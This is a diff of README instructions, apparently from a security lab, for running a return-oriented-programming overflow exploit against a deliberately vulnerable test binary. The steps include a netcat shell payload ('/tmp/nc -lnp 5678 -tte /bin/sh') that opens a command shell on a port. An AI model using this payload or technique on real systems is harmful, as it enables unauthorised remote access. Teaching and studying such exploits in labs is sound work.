@@ -73,11 +73,12 @@ $
 #### Aim
 Open a port on the victim machine using netcat tool that returns a shell (reverse shell exploit).
 #### Steps
-1. Change current directory to `s3` : `cd s3`
+1. Configure and make the netcat tool: `cd ~/netcat-0.7.1` and `sudo ./configure` and `make`
 1. Copy netcat to temporary folder using `sudo cp ~/netcat-0.7.1/src/netcat /tmp/nc` (check using `/tmp/nc --help`)
+1. Change current directory to `s3` : `cd ~/s3`
 1. Compile vuln3.c using `gcc -fno-stack-protector -m32 -static vuln3.c -o vuln3-32-test` (the example binary is already compiled and present under the same name, `vuln3-32-test`, in the current directory)
 1. Build the exploit input string using `python3 ropoverflow_execve.py vuln3-32-test exploit.bin`. When prompted with the message `"Enter exploit parameters:"` enter: `/tmp/nc -lnp 5678 -tte /bin/sh`
-1. Run the compiled vulnerable binary passing the exploit file as input (e.g. `./vuln3-32 exploit.bin`)
+1. Run the compiled vulnerable binary passing the exploit file as input (e.g. `./vuln3-32-test exploit.bin`)
 1. In a separate terminal run `/tmp/nc 127.0.0.1 5678` and check if the reverse shell exploit is working
 
 ### Running `ropoverflow_execve.py` Evaluation
